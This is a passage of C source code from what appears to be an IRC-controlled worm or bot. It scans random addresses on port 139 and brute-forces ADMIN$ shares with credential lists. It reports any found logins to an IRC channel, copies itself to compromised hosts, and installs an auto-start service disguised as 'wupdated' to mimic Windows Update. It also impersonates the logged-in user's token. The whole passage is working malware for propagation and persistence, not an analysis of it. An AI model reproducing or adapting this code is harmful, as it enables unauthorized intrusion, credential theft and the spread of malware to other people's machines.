			irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);	

	        bCopy = CopyFile(szFullPath, szNewName, FALSE);
		    if (bCopy == TRUE)
			{
//---- FILE WAS COPIED, CREATE THE SERVICE... \\/
				sprintf(sendbuf, "File copied to %s", szNewName);
				irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
					//Service creation
				SC_HANDLE hSCM = OpenSCManager( szIPAddr, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
				// Maybe it's already there and installed, let's try to run
				SC_HANDLE hService = OpenService( hSCM, "wupdated", SERVICE_ALL_ACCESS );
				// Creates service on remote machine, if it's not installed yet
				if ( hService == NULL )
					hService = CreateService(
						hSCM, ServiceName, ServiceLongName,
						SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
						SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
						"%SystemRoot%\\system32\\wupdated.exe",
						NULL, NULL, NULL, NULL, NULL );
	 
				if (hService == NULL)
				{
					sprintf(sendbuf, "Unable to create Service on %s", szIPAddr);
					irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
	 
					CloseServiceHandle(hSCM);
					return FALSE;
				}
					
				else
				{
					sprintf(sendbuf, "Service creation successfull %s", szIPAddr);
					irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
				}

				// Start service
				if ( !StartService( hService, 0, NULL ) )
				{
					sprintf(sendbuf, "Unable to start Service on %s", szIPAddr);
					irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
					return FALSE;
				}
				else
				{
					sprintf(sendbuf, "Service was started on %s", szIPAddr);
					irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
					BOOL threadkilled = FALSE;
					for (int i=1; i <= 64; i++) 
					{
						if (strcmp(sendbuf, threadd[i]) == 0)
						{
							TerminateThread(threads[i], 0);
							if (threads[i] != 0) threadkilled = TRUE;
							threads[i] = 0;
							threadd[i][0] = '\0';
			//					cnick[i][0] = '\0';
							i = 65;
						}
					}
					if (threadkilled) irc_privmsg(nt.sock, nt.chan, "nthack stopped.", nt.notice);
				}

				CloseServiceHandle(hService);
				CloseServiceHandle(hSCM);
				BOOL threadkilled = FALSE;
				sprintf(sendbuf, "nt-hack(%s)", nt.ip);

				for (int i=1; i <= 64; i++) 
				{
					if (strcmp(sendbuf, threadd[i]) == 0)
					{
						TerminateThread(threads[i], 0);
						if (threads[i] != 0) threadkilled = TRUE;
						threads[i] = 0;
						threadd[i][0] = '\0';
		//					cnick[i][0] = '\0';
						i = 65;
					}
				}
				if (threadkilled) irc_privmsg(nt.sock, nt.chan, "nthack stopped.", nt.notice);
			}
			else
			{
				sprintf(sendbuf, "Unable to copy file to %s!", nt.ip);
				irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
			}

			/* loop until i get tired or file copy process is completed */
			for (nN = 0; nN < 20; nN++)
			{
				/* try and close the netbios connection */
				dwRet = WNetCancelConnection(NetResource.lpRemoteName, FALSE);
				if (dwRet == NO_ERROR)
				{
					break;
				}
			}
			BOOL threadkilled = FALSE;
			sprintf(sendbuf, "nt-hack(%s)", nt.ip);

		for (int i=1; i <= 64; i++) 
		{
			if (strcmp(sendbuf, threadd[i]) == 0)
			{
				TerminateThread(threads[i], 0);
				if (threads[i] != 0) threadkilled = TRUE;
				threads[i] = 0;
				threadd[i][0] = '\0';
//					cnick[i][0] = '\0';
				i = 65;
			}
		}
		if (threadkilled) irc_privmsg(nt.sock, nt.chan, "nthack stopped.", nt.notice);
		}		
		else
		{
			sprintf(sendbuf, "Error %ld", dwRet);
			irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
		  
			closesocket(Socket);

			BOOL threadkilled = FALSE;
			sprintf(sendbuf, "nt-hack(%s)", nt.ip);

			for (int i=1; i <= 64; i++) 
			{
				if (strcmp(sendbuf, threadd[i]) == 0)
				{
					TerminateThread(threads[i], 0);
					if (threads[i] != 0) threadkilled = TRUE;
					threads[i] = 0;
					threadd[i][0] = '\0';
					i = 65;
				}
			}
			if (threadkilled) irc_privmsg(nt.sock, nt.chan, "nthack stopped.", nt.notice);

		}

	}
    else
	{
		sprintf(sendbuf, "Netbios to %s wasnt open!", nt.ip);
		irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);
		  
		/* apparently they didnt have netbios open, try again with diff ip_addr */
        closesocket(Socket);
    }

	BOOL threadkilled = FALSE;
	sprintf(sendbuf, "nt-hack(%s)", nt.ip);

	for (int i=1; i <= 64; i++) 
	{
		if (strcmp(sendbuf, threadd[i]) == 0)
		{
			TerminateThread(threads[i], 0);
			if (threads[i] != 0) threadkilled = TRUE;
			threads[i] = 0;
			threadd[i][0] = '\0';
//					cnick[i][0] = '\0';
			i = 65;
		}
	}
	if (threadkilled) irc_privmsg(nt.sock, nt.chan, "nthack stopped.", nt.notice);

	return 0;
}

BOOL InstallService(char *lpszMachine)
{
	SC_HANDLE hSCM = OpenSCManager( lpszMachine, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	   // Maybe it's already there and installed, let's try to run

	SC_HANDLE hService = OpenService( hSCM, ServiceName, SERVICE_ALL_ACCESS );

   // Creates service on remote machine, if it's not installed yet
   if ( hService == NULL )
      hService = CreateService(
         hSCM, ServiceName, ServiceLongName,
         SERVICE_ALL_ACCESS, 
         SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
         SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
         "%SystemRoot%\\system32\\wupdated.exe",
         NULL, NULL, NULL, NULL, NULL );
   
   if (hService == NULL)
   {
      CloseServiceHandle(hSCM);
      return FALSE;
   }

   // Start service
   if ( !StartService( hService, 0, NULL ) )
      return FALSE;
   else return TRUE;

   CloseServiceHandle(hService);
   CloseServiceHandle(hSCM);
}

void ImpersonateInteractiveUser(VOID)
{
   HANDLE hToken = NULL;                
   HANDLE hProcess = NULL;

   DWORD processID = GetExplorerProcessID();
   if( processID) 
    {
    hProcess = 
         OpenProcess(PROCESS_ALL_ACCESS,TRUE, processID );

    if( hProcess) 
        {
        if( OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE , &hToken))
        {
         ImpersonateLoggedOnUser( hToken); 
          CloseHandle( hToken );
        }
        CloseHandle( hProcess );
    }
   }
}

DWORD GetExplorerProcessID(VOID)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0) {
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
}

DWORD WINAPI NTScan(LPVOID Param)
{
	ImpersonateInteractiveUser();
	nts nt;
	nt = *((nts *)Param);
    NETRESOURCE NetResource;
    CHAR szRemoteName[MAX_PATH];
    CHAR szIPAddr[MAX_IP];
    DWORD dwFlags;
    DWORD dwRet;
    INT nK;
    INT nL;
    INT nN;
    SOCKET Socket;
    SOCKADDR_IN SockAddr;
    INT nPort;
    INT nConnect;
    CHAR szRemoteShare[MAX_PATH];

    /* infinite loop entry point */
    while (1)
    {
        GetNextIP(szIPAddr);
        /* port scanner for port 139 */
        nPort = 139;
        Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        SockAddr.sin_family = AF_INET;
        SockAddr.sin_port = htons(nPort);
        SockAddr.sin_addr.s_addr = inet_addr(szIPAddr);
        nConnect = connect(Socket, (SOCKADDR *) &SockAddr, sizeof(SockAddr));
        if (nConnect != SOCKET_ERROR)
        {
            closesocket(Socket);

            /* made it this far? construct string */
            /* string should look like: \\10.0.0.1\C$  */
            strcpy(szRemoteName, "\\\\");
            strcat(szRemoteName, szIPAddr);
            strcat(szRemoteName, "\\ADMIN$");
			ZeroMemory  (&NetResource, sizeof(NETRESOURCE));
            NetResource.dwType = RESOURCETYPE_DISK;
            NetResource.lpLocalName = NULL;
            NetResource.lpRemoteName = szRemoteName;
            NetResource.lpProvider = NULL;
            dwFlags = 0;

            /* loop for different usernames to try */
            for (nK = 0; nK < MAX_USERNAME; nK++)
            {
                for (nL = 0; nL < MAX_PASSWORD; nL++)
                {
                    /* establish silent netbios connection with remote system */
                    dwRet = WNetAddConnection2(&NetResource, lpszPassword[nL], lpszUserName[nK], 0);
                    
					if (dwRet == NO_ERROR)
	                {
                        dwRet = WNetCancelConnection(NetResource.lpRemoteName, FALSE);

						char sendbuf[512];
						sprintf(sendbuf, "Found: %s l/p: %s/%s", szIPAddr, lpszUserName[nK], lpszPassword[nL]);
						irc_privmsg(nt.sock, nt.chan, sendbuf, nt.notice);

						DWORD id;
						nth n;
						strncpy(n.ip,  szIPAddr, sizeof(n.ip)-1);
						strncpy(n.u,  lpszUserName[nK], sizeof(n.u)-1);
						strncpy(n.p,  lpszPassword[nL], sizeof(n.p)-1);
						n.sock = nt.sock;
						n.notice = TRUE;
						strncpy(n.chan, channel, sizeof(nt.chan)-1);
						sprintf(sendbuf, "nt-hack(%s)", n.ip);
						n.threadnum = addthread(sendbuf);
						sprintf(sendbuf, "nt hack started (%s) l/p: %s/%s", n.ip, n.u, n.p);
						irc_privmsg(nt.sock, nt.chan, sendbuf, TRUE);
						threads[n.threadnum] = CreateThread(NULL, 0, &nthack, (void *)&n, 0, &id);

						nK = 80;
						nL = 80;

                        /* try and close the netbios connection */
                    /*    if (dwRet == NO_ERROR)
                        {
                                break;
                        }*/
					}
                }
            }
        }
        else
        {
            closesocket(Socket);
        }
        Sleep(512);
	}

}
